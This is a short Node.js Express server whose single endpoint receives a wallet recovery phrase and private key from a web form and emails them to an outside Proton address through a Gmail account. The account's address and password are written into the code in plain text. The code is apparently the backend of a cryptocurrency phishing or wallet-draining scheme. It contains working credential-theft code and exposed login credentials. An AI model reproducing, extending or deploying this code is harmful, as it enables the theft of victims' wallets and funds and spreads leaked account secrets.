const express = require('express');
const nodemailer = require('nodemailer');
const bodyParser = require('body-parser');
const axios = require('axios');
const app = express();
const port = 3000;

// Middleware to parse incoming JSON requests
app.use(bodyParser.json());

// POST endpoint to handle form submission and send email
app.post('/send-email', async (req, res) => {
  const { phrase, privateKey } = req.body;

  // Create the email content
  const emailContent = `Egbon\nphrase: ${phrase}\nprivate: ${privateKey}\n`;

  // Create a transporter using your email service (e.g., Gmail)
  const transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
      user: 'pettyandrew13@gmail.com', // Your email address
      pass: '4ogorene',  // Your email password or app password if 2FA enabled
    },
  });

  // Email options
  const mailOptions = {
    from: 'pettyandrew13@gmail.com', // Sender's email
    to: 'jazzyqueengirl@proton.me', // Recipient's email
    subject: 'Multi Launch',
    text: emailContent, // The email body
  };

  try {
    // Send the email
    await transporter.sendMail(mailOptions);
    res.status(200).json({ message: 'Email sent successfully' });
  } catch (error) {
    console.error('Error sending email:', error);
    res.status(500).json({ message: 'Error sending email' });
  }
});

// Start the server
app.listen(port, () => {
  console.log(`Server is running on http://localhost:${port}`);
});
